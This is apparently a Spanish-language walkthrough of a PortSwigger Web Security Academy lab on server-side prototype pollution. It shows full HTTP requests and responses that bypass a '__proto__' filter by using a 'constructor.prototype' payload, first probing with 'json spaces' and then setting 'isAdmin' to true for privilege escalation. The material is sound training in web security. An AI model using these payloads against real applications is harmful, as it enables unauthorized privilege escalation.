---
description: >-
  https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution
---

# Lab 8: Bypassing flawed input filters for server-side prototype pollution

Iniciamos capturando la peticion y enviando el siguiente request:

{% code overflow="wrap" %}
```json
POST /my-account/change-address HTTP/2
Host: 0a4d00ac040906318067f3b600b7007c.web-security-academy.net
Cookie: session=Sl25AoaD4QZ39pnLlgtkLlvbtBEJ1M8k
Content-Length: 206
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0a4d00ac040906318067f3b600b7007c.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a4d00ac040906318067f3b600b7007c.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"Sl25AoaD4QZ39pnLlgtkLlvbtBEJ1M8k","__proto__": {
    "isAdmin":true
}}
```
{% endcode %}

Pero no funciono:

{% code overflow="wrap" %}
```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"c5-o6PbsdZgCxd7ROzSod5GR7NXS6Q"
Date: Tue, 25 Jun 2024 20:49:10 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 197

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false}
```
{% endcode %}

Por lo anterior, se prueba la siguiente carga:

{% code overflow="wrap" %}
```json
POST /my-account/change-address HTTP/2
Host: 0a4d00ac040906318067f3b600b7007c.web-security-academy.net
Cookie: session=Sl25AoaD4QZ39pnLlgtkLlvbtBEJ1M8k
Content-Length: 208
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0a4d00ac040906318067f3b600b7007c.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a4d00ac040906318067f3b600b7007c.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"Sl25AoaD4QZ39pnLlgtkLlvbtBEJ1M8k","__proto__": {
    "json spaces":10
}}
```
{% endcode %}

La carga utilizada fue:

```json
"__proto__": {
    "json spaces":10
}
```

Al revisar en raw la respuesta no se ve ningun cambio:

{% code overflow="wrap" %}
```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"c5-o6PbsdZgCxd7ROzSod5GR7NXS6Q"
Date: Tue, 25 Jun 2024 20:50:29 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 197

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false}
```
{% endcode %}

Por lo anterior, enviamos esta nueva carga:

{% code overflow="wrap" %}
```json
POST /my-account/change-address HTTP/2
Host: 0a4d00ac040906318067f3b600b7007c.web-security-academy.net
Cookie: session=Sl25AoaD4QZ39pnLlgtkLlvbtBEJ1M8k
Content-Length: 241
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0a4d00ac040906318067f3b600b7007c.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a4d00ac040906318067f3b600b7007c.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"Sl25AoaD4QZ39pnLlgtkLlvbtBEJ1M8k","constructor": {
    "prototype": {
        "json spaces":10
    }
}}
```
{% endcode %}

La petición previa responde asi:

```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"14f-29q9fCGeCtkRxLWffyqshWpiZ64"
Date: Tue, 25 Jun 2024 20:52:19 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 335

{
          "username": "wiener",
          "firstname": "Peter",
          "lastname": "Wiener",
          "address_line_1": "Wiener HQ",
          "address_line_2": "One Wiener Way",
          "city": "Wienerville",
          "postcode": "BU1 1RP",
          "country": "UK",
          "isAdmin": false,
          "json spaces": 10
}
```

Se puede ver el objeto `"json spaces": 10` y tambien la identacion tiene 10 espacios.

Luego de identificar el payload funcional se procede a manipular el objeto que probablemente esta relacionado con el nivel de autorizacion o permisos de dicho usuario:

{% code overflow="wrap" %}
```json
POST /my-account/change-address HTTP/2
Host: 0a4d00ac040906318067f3b600b7007c.web-security-academy.net
Cookie: session=Sl25AoaD4QZ39pnLlgtkLlvbtBEJ1M8k
Content-Length: 239
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0a4d00ac040906318067f3b600b7007c.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a4d00ac040906318067f3b600b7007c.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"Sl25AoaD4QZ39pnLlgtkLlvbtBEJ1M8k","constructor": {
    "prototype": {
        "isAdmin":true
    }
}}
```
{% endcode %}

La carga utilizada fue:

```json
"constructor": {
    "prototype": {
        "isAdmin":true
    }
}
```

Y el resultado de la peticion fue exitoso:

```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"14e-/rxYzhSfiD4zL1vVonmGpZgVmW0"
Date: Tue, 25 Jun 2024 20:55:10 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 334

{
          "username": "wiener",
          "firstname": "Peter",
          "lastname": "Wiener",
          "address_line_1": "Wiener HQ",
          "address_line_2": "One Wiener Way",
          "city": "Wienerville",
          "postcode": "BU1 1RP",
          "country": "UK",
          "isAdmin": true,
          "json spaces": 10
}
```

Por lo anterior, podemos afirmar que se ha realizado una escalacion de privilegios exitosa.
